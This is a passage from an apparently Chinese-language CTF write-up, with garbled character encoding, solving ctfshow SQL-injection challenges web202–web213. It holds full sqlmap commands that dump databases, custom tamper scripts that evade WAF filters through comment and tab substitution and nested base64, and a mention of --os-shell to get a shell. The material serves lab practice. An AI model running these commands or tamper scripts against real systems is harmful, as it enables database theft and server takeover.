class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;      </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤  function waf($str)&#123;   &#x2F;&#x2F;ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º  &#125;  </code></pre><p>é‚£ä¼°è®¡è¦ä½¿ç”¨ --data æŒ‡å®š sqlmap ä»¥ post æ–¹å¼æäº¤æ•°æ®ã€‚</p><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;0cebe0af-c76a-4335-a5a8-16064c4de582.challenge.ctf.show&#x2F;api&#x2F;&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --flush-session</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510162400623.png" alt="image-20220510162400623"></p><h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><blockquote><p>ä½¿ç”¨--method è°ƒæ•´sqlmapçš„è¯·æ±‚æ–¹å¼</p></blockquote><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;      </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤  function waf($str)&#123;   &#x2F;&#x2F;ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º  &#125;</code></pre><p>æç¤ºè¦ç”¨methodæ”¹å˜è¯·æ±‚æ–¹å¼ï¼Œè¿™é‡Œä½¿ç”¨PUTè¯·æ±‚ï¼Œä½†æ˜¯è¦è®°å¾—åŠ ä¸Šè®¾ç½®<code>Content-Type</code>å¤´ï¼Œå¦åˆ™ä¼šå˜æˆè¡¨å•æäº¤</p><pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;43ff4bac-b773-4dbb-a031-4e7733802d21.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --flush-session --method&#x3D;&quot;PUT&quot;æˆ–è€…sqlmap.py -u &quot;http:&#x2F;&#x2F;915e3532-dda5-47a4-82f4-b439e1cd6464.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;ctf.show --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_user -C pass --dump</code></pre><h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><blockquote><p>ä½¿ç”¨--cookie æäº¤cookieæ•°æ®</p></blockquote><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;      </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤  function waf($str)&#123;   &#x2F;&#x2F;ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º  &#125;</code></pre><p>payload</p><p>åŠ ä¸ªcookieå°±è¡Œäº†</p><pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;3231bb16-ffbb-4679-a2ba-6a9687d737e4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;ctfshow&#x3D;64b77e9cb5917892ab53c4a2f6870182; PHPSESSID&#x3D;c2lm2vuriqmg16ilkbh2f9sern&quot; --method&#x3D;&quot;PUT&quot;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510181243184.png" alt="image-20220510181243184"></p><h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><blockquote><p>apiè°ƒç”¨éœ€è¦é‰´æƒ</p></blockquote><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select id,username,password from ctfshow_user where id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;      </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤  function waf($str)&#123;   &#x2F;&#x2F;ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º  &#125;      </code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510181851876.png" alt="image-20220510181851876"></p><p>æ¯æ¬¡æŸ¥è¯¢éƒ½ä¼šè°ƒç”¨ä¸€æ¬¡getToken.phpï¼Œè¿™åº”è¯¥å°±æ˜¯é‰´æƒçš„è¿‡ç¨‹</p><p>sqlmapä¸­</p><pre class="language-none"><code class="language-none">--safe-url æä¾›ä¸€ä¸ªå®‰å…¨ä¸é”™è¯¯çš„è¿æ¥ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´éƒ½ä¼šå»è®¿é—®ä¸€ä¸‹--safe-freq æä¾›ä¸€ä¸ªå®‰å…¨ä¸é”™è¯¯çš„è¿æ¥ï¼Œè®¾ç½®æ¯æ¬¡æ³¨å…¥æµ‹è¯•å‰è®¿é—®å®‰å…¨é“¾æ¥çš„æ¬¡æ•°</code></pre><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;3c435471-9eeb-4118-ab03-80d1e15f215d.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;9i0d9ub2ad7q4rl94r3pi9vf23&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;3c435471-9eeb-4118-ab03-80d1e15f215d.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510182857216.png" alt="image-20220510182857216"></p><h2 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h2><blockquote><p>sqléœ€è¦é—­åˆ</p></blockquote><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; (&#39;&quot;.$id.&quot;&#39;) limit 0,1;&quot;;      </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤  function waf($str)&#123;   &#x2F;&#x2F;ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º  &#125;   </code></pre><p>sqlmapä¼šè‡ªåŠ¨ç»™ä½ æŠŠè¯­å¥é—­åˆçš„ï¼Œæ‰€ä»¥å¯ä»¥ç»§ç»­ç”¨ä¸Šä¸€é¢˜çš„payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;191dbe2e-0be0-4de8-aa21-666eda4b7951.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;191dbe2e-0be0-4de8-aa21-666eda4b7951.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510183308961.png" alt="image-20220510183308961"></p><h2 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h2><blockquote><p>--tamper çš„åˆä½“éªŒ</p></blockquote><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; (&#39;&quot;.$id.&quot;&#39;) limit 0,1;&quot;;</code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤  function waf($str)&#123;   return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);  &#125;</code></pre><p>è¿‡æ»¤äº†ç©ºæ ¼</p><p>sqlmapæä¾›äº†tamperè„šæœ¬ç”¨äºåº”å¯¹æ­¤ç§æƒ…å†µï¼Œtamperçš„å‡ºç°æ˜¯ä¸ºäº†å¼•å…¥ç”¨æˆ·è‡ªå®šä¹‰çš„è„šæœ¬æ¥ä¿®æ”¹payloadä»¥è¾¾åˆ°ç»•è¿‡wafçš„ç›®çš„ã€‚sqlmapè‡ªå¸¦çš„tamperè„šæœ¬æ–‡ä»¶éƒ½åœ¨sqlmapçš„tamperæ–‡ä»¶å¤¹ä¸‹</p><pre class="language-txt" data-language="txt"><code class="language-txt">ä¸¾ä¾‹å¦‚ä¸‹tamperè„šæœ¬ï¼šapostrophemask.py ç”¨utf8ä»£æ›¿å¼•å·equaltolike.py MSSQL * SQLiteä¸­like ä»£æ›¿ç­‰å·greatest.py MySQLä¸­ç»•è¿‡è¿‡æ»¤â€™&gt;â€™ ,ç”¨GREATESTæ›¿æ¢å¤§äºå·space2hash.py ç©ºæ ¼æ›¿æ¢ä¸º#å· éšæœºå­—ç¬¦ä¸² ä»¥åŠæ¢è¡Œç¬¦space2comment.py ç”¨&#x2F;**&#x2F;ä»£æ›¿ç©ºæ ¼apostrophenullencode.py MySQL 4, 5.0 and 5.5ï¼ŒOracle 10gï¼ŒPostgreSQLç»•è¿‡è¿‡æ»¤åŒå¼•å·ï¼Œæ›¿æ¢å­—ç¬¦å’ŒåŒå¼•å·halfversionedmorekeywords.py å½“æ•°æ®åº“ä¸ºmysqlæ—¶ç»•è¿‡é˜²ç«å¢™ï¼Œæ¯ä¸ªå…³é”®å­—ä¹‹å‰æ·»åŠ mysqlç‰ˆæœ¬è¯„è®ºspace2morehash.py MySQLä¸­ç©ºæ ¼æ›¿æ¢ä¸º #å· ä»¥åŠæ›´å¤šéšæœºå­—ç¬¦ä¸² æ¢è¡Œç¬¦appendnullbyte.p Microsoft Accessåœ¨æœ‰æ•ˆè´Ÿè·ç»“æŸä½ç½®åŠ è½½é›¶å­—èŠ‚å­—ç¬¦ç¼–ç ifnull2ifisnull.py MySQLï¼ŒSQLite (possibly)ï¼ŒSAP MaxDBç»•è¿‡å¯¹ IFNULL è¿‡æ»¤space2mssqlblank.py mssqlç©ºæ ¼æ›¿æ¢ä¸ºå…¶å®ƒç©ºç¬¦å·base64encode.py ç”¨base64ç¼–ç space2mssqlhash.py mssqlæŸ¥è¯¢ä¸­æ›¿æ¢ç©ºæ ¼modsecurityversioned.py mysqlä¸­è¿‡æ»¤ç©ºæ ¼ï¼ŒåŒ…å«å®Œæ•´çš„æŸ¥è¯¢ç‰ˆæœ¬æ³¨é‡Šspace2mysqlblank.py mysqlä¸­ç©ºæ ¼æ›¿æ¢å…¶å®ƒç©ºç™½ç¬¦å·between.py MS SQL 2005ï¼ŒMySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0ä¸­ç”¨betweenæ›¿æ¢å¤§äºå·ï¼ˆ&gt;ï¼‰space2mysqldash.py MySQLï¼ŒMSSQLæ›¿æ¢ç©ºæ ¼å­—ç¬¦ï¼ˆâ€ï¼‰ï¼ˆâ€™ â€“ â€˜ï¼‰åè·Ÿä¸€ä¸ªç ´æŠ˜å·æ³¨é‡Šä¸€ä¸ªæ–°è¡Œï¼ˆâ€™ nâ€™ï¼‰multiplespaces.py å›´ç»•SQLå…³é”®å­—æ·»åŠ å¤šä¸ªç©ºæ ¼space2plus.py ç”¨+æ›¿æ¢ç©ºæ ¼bluecoat.py MySQL 5.1, SGOSä»£æ›¿ç©ºæ ¼å­—ç¬¦åä¸ä¸€ä¸ªæœ‰æ•ˆçš„éšæœºç©ºç™½å­—ç¬¦çš„SQLè¯­å¥ã€‚ ç„¶åæ›¿æ¢&#x3D;ä¸ºlikenonrecursivereplacement.py åŒé‡æŸ¥è¯¢è¯­å¥ã€‚å–ä»£predefined SQLå…³é”®å­—withè¡¨ç¤º suitable foræ›¿ä»£space2randomblank.py ä»£æ›¿ç©ºæ ¼å­—ç¬¦ï¼ˆâ€œâ€ï¼‰ä»ä¸€ä¸ªéšæœºçš„ç©ºç™½å­—ç¬¦å¯é€‰å­—ç¬¦çš„æœ‰æ•ˆé›†sp_password.py è¿½åŠ sp_passwordâ€™ä»DBMSæ—¥å¿—çš„è‡ªåŠ¨æ¨¡ç³Šå¤„ç†çš„26 æœ‰æ•ˆè½½è·çš„æœ«å°¾chardoubleencode.py åŒurlç¼–ç (ä¸å¤„ç†ä»¥ç¼–ç çš„)unionalltounion.py æ›¿æ¢UNION ALL SELECT UNION SELECTcharencode.py Microsoft SQL Server 2005ï¼ŒMySQL 4, 5.0 and 5.5ï¼ŒOracle 10gï¼ŒPostgreSQL 8.3, 8.4, 9.0urlç¼–ç ï¼›randomcase.py Microsoft SQL Server 2005ï¼ŒMySQL 4, 5.0 and 5.5ï¼ŒOracle 10gï¼ŒPostgreSQL 8.3, 8.4, 9.0ä¸­éšæœºå¤§å°å†™unmagicquotes.py å®½å­—ç¬¦ç»•è¿‡ GPC addslashesrandomcomments.py ç”¨&#x2F;**&#x2F;åˆ†å‰²sqlå…³é”®å­—charunicodeencode.py ASPï¼ŒASP.NETä¸­å­—ç¬¦ä¸² unicode ç¼–ç securesphere.py è¿½åŠ ç‰¹åˆ¶çš„å­—ç¬¦ä¸²versionedmorekeywords.py MySQL &gt;&#x3D; 5.1.13æ³¨é‡Šç»•è¿‡halfversionedmorekeywords.py MySQL &lt; 5.1ä¸­å…³é”®å­—å‰åŠ æ³¨é‡Š</code></pre><p>å¯¹äºæœ¬é¢˜ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨tamperæ–‡ä»¶å¤¹ä¸‹çš„space2comment.pyæ–‡ä»¶ï¼Œpayloadä¸º</p><pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;f0b03390-e045-4d1a-ba12-80ead13bd7c4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;f0b03390-e045-4d1a-ba12-80ead13bd7c4.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510222235981.png" alt="image-20220510222235981"></p><h2 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h2><blockquote><p>-tamper çš„2ä½“éªŒ</p></blockquote><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; (&#39;&quot;.$id.&quot;&#39;) limit 0,1;&quot;;      </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤&#x2F;&#x2F; $id &#x3D; str_replace(&#39;select&#39;, &#39;&#39;, $id);  function waf($str)&#123;   return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);  &#125; </code></pre><p>selectè¢«æ›¿æ¢ä¸ºç©ºç™½ï¼Œä½†æ˜¯è¿™é‡Œåªè¿‡æ»¤äº†å°å†™ï¼Œè€Œsqlmapé‡Œç”¨çš„ä¸€èˆ¬éƒ½æ˜¯å¤§å†™</p><pre class="language-none"><code class="language-none">python sqlmap.py -u &quot;http:&#x2F;&#x2F;3edc67ff-a1b2-4540-9a32-d9672278fc57.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;3edc67ff-a1b2-4540-9a32-d9672278fc57.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510223034551.png" alt="image-20220510223034551"></p><p>çœ‹ï¼Œç¡®å®æ˜¯å¤§å†™çš„select</p><p>ä½†æ˜¯è¿™é“é¢˜æ˜¯è¦è€ƒtamperè„šæœ¬çš„ç¼–å†™</p><p>è´´ä¸‹y4å¸ˆå‚…çš„</p><p><a href="https://y4er.com/post/sqlmap-tamper/">https://y4er.com/post/sqlmap-tamper/</a></p><pre class="language-py" data-language="py"><code class="language-py">#!&#x2F;usr&#x2F;bin&#x2F;env python&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;from lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ &#x3D; PRIORITY.LOWdef tamper(payload, **kwargs):    payload &#x3D; space2comment(payload)    return payloaddef space2comment(payload):    retVal &#x3D; payload    if payload:        retVal &#x3D; &quot;&quot;        quote, doublequote, firstspace &#x3D; False, False, False        for i in xrange(len(payload)):            if not firstspace:                if payload[i].isspace():                    firstspace &#x3D; True                    retVal +&#x3D; chr(0x0a)                    continue            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:                quote &#x3D; not quote            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:                doublequote &#x3D; not doublequote            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:                retVal +&#x3D; chr(0x0a)                continue            retVal +&#x3D; payload[i]    return retVal</code></pre><h2 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h2><blockquote><p>--tamper çš„3ä½“éªŒ</p></blockquote><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 0,1;&quot;;      </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤  function waf($str)&#123;   &#x2F;&#x2F;TODO æœªå®Œå·¥   return preg_match(&#39;&#x2F; |\*|\&#x3D;&#x2F;&#39;, $str);  &#125;</code></pre><p>è¿™é¢˜éœ€è¦å°†ç©ºæ ¼å’Œ<code>*</code>ï¼Œ<code>=</code>æ›¿æ¢ï¼Œè‡ªå·±å†™ä¸€ä¸ªtamper</p><p>(è¿˜æ²¡å­¦ä¼šï¼Œæˆ‘æ˜¯åºŸç‰©www</p><pre class="language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;from lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ &#x3D; PRIORITY.LOWdef tamper(payload, **kwargs):    payload &#x3D; space2comment(payload)    return payloaddef space2comment(payload):    retVal &#x3D; payload    if payload:        retVal &#x3D; &quot;&quot;        quote, doublequote, firstspace &#x3D; False, False, False        for i in xrange(len(payload)):            if not firstspace:                if payload[i].isspace():                    firstspace &#x3D; True                    retVal +&#x3D; chr(0x0a)                    continue            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:                quote &#x3D; not quote            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:                doublequote &#x3D; not doublequote            elif payload[i] &#x3D;&#x3D; &quot;*&quot;:                retVal +&#x3D; chr(0x31)                continue            elif payload[i] &#x3D;&#x3D; &quot;&#x3D;&quot;:                retVal +&#x3D; chr(0x0a)+&#39;like&#39;+chr(0x0a)                continue            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:                retVal +&#x3D; chr(0x0a)                continue            retVal +&#x3D; payload[i]    return retVal</code></pre><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;a0b33203-ce0f-492c-8058-7ee5ba5e6149.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;a0b33203-ce0f-492c-8058-7ee5ba5e6149.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web209</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510223906906.png" alt="image-20220510223906906"></p><h2 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h2><blockquote><p>--tamper çš„4ä½“éªŒ</p></blockquote><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 0,1;&quot;;      </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;</code></pre><p>å¯¹å†…å®¹å…ˆbase64è§£ç ç„¶åé€†åºå†base64è§£ç å†é€†åº</p><p>tamper:</p><pre class="language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python&quot;&quot;&quot;Copyright (c) 2006-2021 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)See the file &#39;LICENSE&#39; for copying permission&quot;&quot;&quot;from lib.core.enums import PRIORITYfrom lib.core.common import singleTimeWarnMessageimport base64__priority__ &#x3D; PRIORITY.LOWdef dependencies():    singleTimeWarnMessage(&quot;åˆ«å¥—äº†åˆ«å¥—äº†&quot;)def tamper(payload, **kwargs):    retVal &#x3D; payload    if payload:        retVal &#x3D; retVal.encode()        retVal &#x3D; retVal[::-1]        retVal &#x3D; base64.b64encode(retVal)        retVal &#x3D; retVal[::-1]        retVal &#x3D; base64.b64encode(retVal)        retVal &#x3D; retVal.decode()    return retVal</code></pre><h2 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h2><p>å¤šè¿‡æ»¤äº†ä¸€ä¸ªç©ºæ ¼</p><pre class="language-none"><code class="language-none">  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;function waf($str)&#123;    return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);&#125;</code></pre><p>tamper</p><pre class="language-python" data-language="python"><code class="language-python">from lib.core.enums import PRIORITYfrom lib.core.common import singleTimeWarnMessageimport base64__priority__ &#x3D; PRIORITY.LOWdef dependencies():    singleTimeWarnMessage(&quot;åˆ«å¥—äº†åˆ«å¥—äº†&quot;)def tamper(payload, **kwargs):    retVal &#x3D; payload    retVal &#x3D; retVal.replace(&quot; &quot;, &quot;&#x2F;**&#x2F;&quot;)    retVal &#x3D; retVal.encode()    retVal &#x3D; retVal[::-1]    retVal &#x3D; base64.b64encode(retVal)    retVal &#x3D; retVal[::-1]    retVal &#x3D; base64.b64encode(retVal)    retVal &#x3D; retVal.decode()    return retVal</code></pre><h2 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h2><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;function waf($str)&#123;    return preg_match(&#39;&#x2F; |\*&#x2F;&#39;, $str);&#125;</code></pre><p>æ¯”ä¸Šä¸€ä¸ªåˆå¤šè¿‡æ»¤äº†ä¸€ä¸ªæ˜Ÿå·</p><p>tamperï¼š</p><pre class="language-none"><code class="language-none">from lib.core.enums import PRIORITYfrom lib.core.common import singleTimeWarnMessageimport base64__priority__ &#x3D; PRIORITY.LOWdef dependencies():    singleTimeWarnMessage(&quot;åˆ«å¥—äº†åˆ«å¥—äº†&quot;)def tamper(payload, **kwargs):    payload &#x3D; bypass(payload)    retVal &#x3D; payload    retVal &#x3D; retVal.encode()    retVal &#x3D; retVal[::-1]    retVal &#x3D; base64.b64encode(retVal)    retVal &#x3D; retVal[::-1]    retVal &#x3D; base64.b64encode(retVal)    retVal &#x3D; retVal.decode()    return retValdef bypass(payload):    retVal &#x3D; &quot;&quot;    for i in range(len(payload)):        if payload[i]&#x3D;&#x3D;&quot; &quot;:            retVal +&#x3D; chr(0x9)        else:            retVal +&#x3D; payload[i]    return retVal</code></pre><h2 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h2><p>è¿™ä¸€é¢˜flagä¸åœ¨æ•°æ®åº“ä¸­ï¼Œå› æ­¤éœ€è¦åˆ©ç”¨â€“os-shellè¿›è¡Œgetshell</p><blockquote><p><strong>â€“os-shell</strong> å…¶æœ¬è´¨æ˜¯å†™å…¥ä¸¤ä¸ªshellæ–‡ä»¶ï¼Œå…¶ä¸­ä¸€ä¸ªå¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯å¯ä»¥è®©æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ï¼›<br>ä¸è¿‡ä¹Ÿæ˜¯æœ‰é™åˆ¶çš„ï¼Œä¸Šä¼ æ–‡ä»¶æˆ‘ä»¬éœ€è¦å—åˆ°ä¸¤ä¸ªæ¡ä»¶çš„é™åˆ¶ï¼Œä¸€ä¸ªæ˜¯ç½‘ç«™çš„ç»å¯¹è·¯å¾„ï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯å¯¼å…¥å¯¼å‡ºçš„æƒé™</p><p>åœ¨mysqlä¸­ï¼Œç”± <strong>secure_file_priv</strong> 